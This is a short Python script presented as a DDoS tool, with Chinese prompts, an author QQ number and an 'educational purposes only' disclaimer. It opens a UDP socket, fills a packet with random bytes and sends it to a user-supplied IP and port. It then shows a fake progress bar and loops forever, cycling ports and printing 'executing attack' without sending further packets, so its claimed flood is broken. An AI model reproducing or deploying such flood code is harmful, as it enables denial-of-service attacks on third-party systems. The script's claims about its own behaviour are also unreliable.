import os
import time
import socket
import random
from datetime import datetime
import pyfiglet
from past.builtins import raw_input

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("cls")
text =("Author   :ddos")
ascii_art = pyfiglet.figlet_format(text)
print(ascii_art)
print ("制作人QQ ： 2753416075")
print ("制作人 ： 缘梦未来")
print ("免责声明 ： 此工具只能用于教育目的。您的决定不是我们的责任。")
print
ip = raw_input("输入ip : ")
port = int(input("端口       : "))
sock.sendto(bytes, (ip,port))

os.system("cls")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sent = sent + 1
     port = port + 1
     print(f"正在执行攻击{ip,port}")
     if port == 65534:
       port = 1